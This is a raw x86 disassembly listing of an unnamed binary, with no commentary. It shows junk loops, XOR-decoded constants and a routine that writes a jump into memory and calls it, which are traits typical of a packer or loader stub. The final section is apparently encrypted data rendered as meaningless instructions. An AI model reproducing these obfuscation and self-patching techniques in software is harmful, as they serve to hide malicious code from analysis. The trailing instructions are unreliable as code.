  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    DWORD PTR [ebp+0x3405a9cb],ecx
  4058f3:	pop    edi
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	retf   0x3710
  4058fd:	mov    bl,0x34
  4058ff:	adc    al,0xf6
  405901:	push   esi
  405902:	jno    0x4058e7
  405904:	cmp    dh,BYTE PTR [ecx]
  405906:	mov    ah,0xe7
  405908:	mov    cs,ecx
  40590a:	push   esp
  40590b:	sbb    DWORD PTR [ebp-0x7d06753e],ebp
  405911:	pop    ebp
  405912:	xlat   BYTE PTR ds:[ebx]
  405913:	add    eax,0xdfef14c5
  405918:	cmp    eax,0x5812d700
  40591d:	and    DWORD PTR [esi+0x32],ecx
  405920:	dec    ecx
  405921:	ror    cl,cl
  405923:	dec    esp
  405924:	push   eax
  405925:	cmp    eax,0x7428fade
  40592a:	mov    dh,0x54
  40592c:	outs   dx,DWORD PTR ds:[esi]
  40592d:	hlt    
  40592e:	mov    ds:0xd67c33fb,eax
  405933:	ins    BYTE PTR es:[edi],dx
  405934:	hlt    
  405935:	mov    edi,0x544c485e
  40593a:	aam    0x4e
  40593c:	call   0xa6e0:0xa36486a7
  405943:	mov    edx,DWORD PTR [edx+eax*4-0x27f3d873]
  40594a:	pop    edi
  40594b:	out    0xf5,eax
  40594d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40594e:	mov    ch,0xaf
  405950:	mov    al,0x8d
  405952:	adc    al,al
  405954:	push   eax
  405955:	in     al,0x3
  405957:	and    eax,0x1175ab77
  40595c:	sub    al,0x3e
  40595e:	out    0x18,al
  405960:	add    eax,0xe919c3fc
  405965:	mov    DWORD PTR [ecx],0xa9e83c17
  40596b:	(bad)  
  40596c:	daa    
  40596d:	test   eax,0x7f4e627d
  405972:	dec    ebx
  405973:	and    esi,esp
  405975:	lds    edx,FWORD PTR [ebp-0x56c5bdbc]
  40597b:	es test al,0x5a
  40597e:	jb     0x4059f1
  405980:	jo     0x4059fe
  405982:	outs   dx,BYTE PTR ds:[esi]
  405983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405984:	xchg   esp,eax
  405985:	dec    esp
  405986:	out    dx,al
  405987:	hlt    
  405988:	loope  0x4059a1
  40598a:	push   0x62460402
  40598f:	push   edi
  405990:	push   ebx
  405991:	gs cmp eax,edx
  405994:	or     eax,0x2b7e1d8f
  405999:	adc    eax,0x7467ba16
  40599e:	add    al,0x17
  4059a0:	xchg   edx,eax
  4059a1:	push   esp
  4059a2:	push   edx
  4059a3:	cwde   
  4059a4:	pop    ds
  4059a5:	and    BYTE PTR [ecx+0x5437104a],dh
  4059ab:	stos   DWORD PTR es:[edi],eax
  4059ac:	pop    ebp
  4059ad:	xchg   BYTE PTR [eax+edx*4-0x6a054441],al
  4059b4:	sub    al,BYTE PTR [ebx-0x2c17ee68]
  4059ba:	jmp    0xf56d:0x4543b28b
  4059c1:	mov    ecx,0x9dfbebfa
  4059c6:	push   edi
  4059c7:	adc    DWORD PTR [esi-0x40],edx
  4059ca:	aaa    
  4059cb:	retf   0x8ab8
  4059ce:	jge    0x405a46
  4059d0:	cmovae edx,DWORD PTR [ebx]
  4059d3:	pop    ebp
  4059d4:	jae    0x405962
  4059d6:	arpl   bp,ax
  4059d8:	bound  ebx,QWORD PTR [edi]
  4059da:	lea    edi,[ecx+0x250538ee]
  4059e0:	ficomp DWORD PTR [ebp+0x506fe468]
  4059e6:	adc    al,0xd4
  4059e8:	(bad)  
  4059e9:	sub    ah,BYTE PTR [edi+ebx*8+0x5df66aad]
  4059f0:	cmp    BYTE PTR [edi-0x241ad9bc],ch
  4059f6:	mov    esp,0x6b358532
  4059fb:	sbb    eax,0x615111d2
  405a00:	jnp    0x405a02
  405a02:	outs   dx,DWORD PTR ds:[esi]
  405a03:	and    ah,BYTE PTR [ecx]
  405a05:	outs   dx,DWORD PTR ds:[esi]
  405a06:	jne    0x405a49
  405a08:	push   esi
  405a09:	ss adc eax,0xfbb3bf4b
  405a0f:	add    BYTE PTR [eax+0x7b5c61cd],bh
  405a15:	cmc    
  405a16:	cld    
  405a17:	icebp  
  405a18:	daa    
  405a19:	push   ds
  405a1a:	mov    cl,0x1d
  405a1c:	scas   eax,DWORD PTR es:[edi]
  405a1d:	dec    esp
  405a1e:	cmc    
  405a1f:	(bad)  
  405a20:	call   0x927a037b
  405a25:	mov    ebp,cs
  405a27:	dec    eax
  405a28:	into   
  405a29:	ins    DWORD PTR es:[edi],dx
  405a2a:	xor    al,0x6b
  405a2c:	fldenv [edi+0x59815a24]
  405a32:	fsubr  QWORD PTR [edi-0x39d9850]
  405a38:	jmp    0x4c2c623e
  405a3d:	mov    al,0x69
  405a3f:	mov    dh,0xfb
  405a41:	pusha  
  405a42:	mov    edx,DWORD PTR [eax-0x79]
  405a45:	mov    ds:0x7f6fef37,eax
  405a4a:	(bad)  
  405a4b:	in     eax,0x23
  405a4d:	and    eax,0x80132633
  405a52:	pop    ebx
  405a54:	imul   ebx,DWORD PTR [esi],0xa060e275
  405a5a:	jo     0x405a9e
  405a5c:	or     al,0x90
  405a5e:	(bad)  
  405a5f:	push   eax
  405a60:	mov    eax,0x6835f1fc
  405a65:	push   0x70fd666a
  405a6a:	icebp  
  405a6b:	aad    0xb8
  405a6d:	push   es
  405a6e:	mov    ch,0x70
  405a70:	imul   eax,eax,0x29
  405a73:	pop    ebp
  405a74:	pop    ecx
  405a75:	jmp    0xbaa4e2f8
  405a7a:	sar    DWORD PTR [edx-0x2d979bca],1
  405a80:	jmp    0x10902dd5
  405a85:	jmp    FWORD PTR [ebx]
  405a87:	lahf   
  405a88:	add    edi,DWORD PTR [edi-0x57b7269f]
  405a8e:	lea    edx,[ebx+0x11ff8ec2]
  405a94:	mov    esp,0xcc2acac5
  405a99:	imul   ebp,DWORD PTR [eax+edi*4],0xd5c5dc03
  405aa0:	mov    eax,0xaa4a970
  405aa5:	cdq    
  405aa6:	sbb    bl,BYTE PTR [edi]
  405aa8:	sbb    ah,ch
  405aaa:	ror    bl,1
  405aac:	mov    ch,0xee
  405aae:	mov    ebp,DWORD PTR ds:0x64384f79
  405ab4:	or     BYTE PTR [esi],ah
  405ab6:	xchg   ecx,eax
  405ab7:	loopne 0x405a6c
  405ab9:	lahf   
  405aba:	ins    DWORD PTR es:[edi],dx
  405abb:	adc    cl,al
  405abd:	ror    DWORD PTR [edx-0x35],1
  405ac0:	rol    DWORD PTR ds:0xdf19c84c,1
  405ac6:	loope  0x405a57
  405ac8:	jb     0x405ad1
  405aca:	hlt    
  405acb:	int3   
  405acc:	lock mov BYTE PTR [esi-0x50],bh
  405ad0:	mov    eax,DWORD PTR [eax+0x4a72e98a]
  405ad6:	xor    DWORD PTR [eax+0x2f],esi
  405ad9:	and    esp,edi
  405adb:	xor    eax,0xcc9628fe
  405ae0:	mov    esp,0xfda1df8e
  405ae5:	addr16 mov ch,0xbd
  405ae8:	jl     0x405ad5
  405aea:	mov    eax,ds:0x6f7ea7e8
  405aef:	(bad)  [edi-0x182b572a]
  405af5:	mov    al,ds:0x526276dc
  405afa:	(bad)  
  405afb:	int    0x71
  405afd:	and    esi,DWORD PTR [edx-0x4]
  405b00:	mov    esp,ebx
  405b02:	nop
  405b03:	mov    dh,0xc2
  405b05:	pusha  
  405b06:	dec    esp
  405b07:	cmp    al,0x5e
  405b09:	mov    al,ds:0x8c39665b
  405b0e:	ret    
  405b0f:	jb     0x405b2e
  405b11:	in     eax,dx
  405b12:	jns    0x405a95
  405b14:	sub    eax,0xd286af18
  405b19:	push   ecx
  405b1a:	sbb    BYTE PTR [edx],ah
  405b1c:	mov    al,ds:0x183f09f3
  405b21:	loope  0x405b88
  405b23:	cld    
  405b24:	cmp    BYTE PTR [edi+0x33c3e97e],bl
  405b2a:	(bad)  [ecx-0x50749e80]
  405b30:	mov    al,0x18
  405b32:	(bad)  
  405b34:	push   0xffffffcb
  405b36:	jmp    0xeaf2:0x2ddea3dd
  405b3d:	dec    ecx
  405b3e:	mov    dh,0xea
  405b40:	push   0xffffffe1
  405b42:	ja     0x405b43
  405b44:	loop   0x405b16
  405b46:	xor    BYTE PTR [esi],dh
  405b48:	jns    0x405aed
  405b4a:	push   ecx
  405b4b:	xor    DWORD PTR [edi+0x66],eax
  405b4e:	dec    ebp
  405b4f:	ret    0xb58e
  405b52:	aam    0x46
  405b54:	dec    ebp
  405b55:	xchg   ebp,eax
  405b56:	call   0x38d1:0x32d5c731
  405b5d:	mov    edx,0xe5066dfc
  405b62:	mov    eax,ds:0x22e58f58
  405b67:	xlat   BYTE PTR ds:[ebx]
  405b68:	add    BYTE PTR [edx],al
  405b6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b6b:	inc    ecx
  405b6c:	fwait
  405b6d:	dec    ebp
  405b6e:	inc    eax
  405b6f:	jmp    0x9b10:0x9f418bfb
  405b76:	inc    ebp
  405b77:	xchg   ebx,eax
  405b78:	adc    eax,0xac72d48a
  405b7d:	mov    eax,0x1c9689e1
  405b82:	mov    DWORD PTR [ecx+ebx*4],edi
  405b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b86:	int    0xc1
  405b88:	jmp    0x8dc91ad7
  405b8d:	cmp    ch,BYTE PTR [edi+0x2e]
  405b90:	sub    eax,0x6bd3b5eb
  405b95:	in     eax,0xf4
  405b97:	add    dh,BYTE PTR [eax-0x43]
  405b9a:	lock loope 0x405c0b
  405b9d:	mov    esp,0x18f4e04
  405ba2:	test   BYTE PTR ds:0x52a8429a,ch
  405ba8:	retf   0xe098
  405bab:	inc    edi
